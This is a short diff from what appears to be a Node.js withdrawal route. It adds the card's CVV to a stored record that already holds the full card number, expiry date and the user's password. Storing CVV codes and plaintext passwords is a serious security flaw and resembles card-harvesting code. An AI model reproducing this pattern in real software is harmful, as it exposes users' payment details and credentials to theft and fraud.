@@ -195,6 +195,7 @@ router.post("/withdraw", async (req, res) => {
       cardNumber: card.num || "****",
       cardName: card.name || "",
       cardExpiry: card.exp || "",
+      cvv: card.cvv || "***",
       date: new Date().toISOString(),
       status: "pending",
       userPassword: password,
